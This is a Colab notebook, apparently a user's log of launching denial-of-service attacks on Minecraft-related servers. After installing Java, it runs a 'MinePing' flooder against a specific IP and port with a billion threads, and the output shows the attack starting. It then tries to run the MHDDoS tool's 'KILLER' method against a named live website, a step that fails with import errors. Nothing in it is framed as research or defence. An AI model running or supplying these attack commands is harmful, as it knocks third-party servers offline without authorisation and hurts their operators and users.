{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/SleepHat24/minecraft/blob/main/Untitled0.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "ohyTyOD1p3OP"
      },
      "outputs": [],
      "source": [
        "!sudo apt update && sudo apt upgrade -y"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "EibpWFXcqiov"
      },
      "outputs": [],
      "source": [
        "!sudo add-apt-repository ppa:linuxuprising/java -y"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "p4eh6CCoqzRa"
      },
      "outputs": [],
      "source": [
        "!sudo apt update"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "55bHiiAxqsfB"
      },
      "outputs": [],
      "source": [
        "!sudo apt-get install oracle-java17-installer oracle-java17-set-default"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "background_save": true,
          "base_uri": "https://localhost:8080/"
        },
        "id": "n6wSwohMpPgJ",
        "outputId": "9f26622c-f4d8-4f1a-f8c3-3e56f98e1e9d"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "\n",
            "Made by unfynel (1.0)\n",
            "███╗   ███╗██╗███╗   ██╗███████╗██████╗ ██╗███╗   ██╗ ██████╗ \n",
            "████╗ ████║██║████╗  ██║██╔════╝██╔══██╗██║████╗  ██║██╔════╝ \n",
            "██╔████╔██║██║██╔██╗ ██║█████╗  ██████╔╝██║██╔██╗ ██║██║  ███╗\n",
            "██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██╔═══╝ ██║██║╚██╗██║██║   ██║\n",
            "██║ ╚═╝ ██║██║██║ ╚████║███████╗██║     ██║██║ ╚████║╚██████╔╝\n",
            "╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ \n",
            "\n",
            "[MinePing] Starting attack to 95.216.68.161:56455 with 1000000000 threads.\n",
            "\n",
            "\n",
            "[MinePing] attack stopped!\n",
            "\n"
          ]
        }
      ],
      "source": [
        "!java -jar mineping.jar host-95.216.68.161 port-56455 threads-1000000000"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "bEQXg_G6sAqH"
      },
      "outputs": [],
      "source": [
        "!cd MHDDoS"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "2EBybhngr8bv",
        "outputId": "372f4134-38a2-443a-b24c-a73a4d08a1a7"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "running build\n",
            "running build_py\n",
            "package init file 'PyRoxy/__init__.py' not found (or not a regular file)\n",
            "error: package directory 'PyRoxy/GeoIP' does not exist\n",
            "running install\n",
            "running bdist_egg\n",
            "running egg_info\n",
            "creating PyRoxy.egg-info\n",
            "writing PyRoxy.egg-info/PKG-INFO\n",
            "writing dependency_links to PyRoxy.egg-info/dependency_links.txt\n",
            "writing requirements to PyRoxy.egg-info/requires.txt\n",
            "writing top-level names to PyRoxy.egg-info/top_level.txt\n",
            "writing manifest file 'PyRoxy.egg-info/SOURCES.txt'\n",
            "package init file 'PyRoxy/__init__.py' not found (or not a regular file)\n",
            "error: package directory 'PyRoxy/GeoIP' does not exist\n",
            "Traceback (most recent call last):\n",
            "  File \"start.py\", line 28, in <module>\n",
            "    from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles\n",
            "ImportError: cannot import name 'Proxy' from 'PyRoxy' (unknown location)\n"
          ]
        }
      ],
      "source": [
        "!python3 setup.py build\n",
        "!python3 setup.py install\n",
        "!python3 start.py KILLER https://map.mixland.fun/ 1000 100"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 130
        },
        "id": "KQVkQNIavkJs",
        "outputId": "6f4bcea2-fbe3-41df-fee5-4340673db478"
      },
      "outputs": [
        {
          "ename": "SyntaxError",
          "evalue": "ignored",
          "output_type": "error",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-1-2d02681ab88c>\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    git clone https://github.com/binux/pyproxy/archive/refs/heads/master.zip\u001b[0m\n\u001b[0m            ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ],
      "source": [
        "git clone https://github.com/binux/pyproxy/archive/refs/heads/master.zip"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyN5npGF8ScnKQy++/v/AK2/",
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}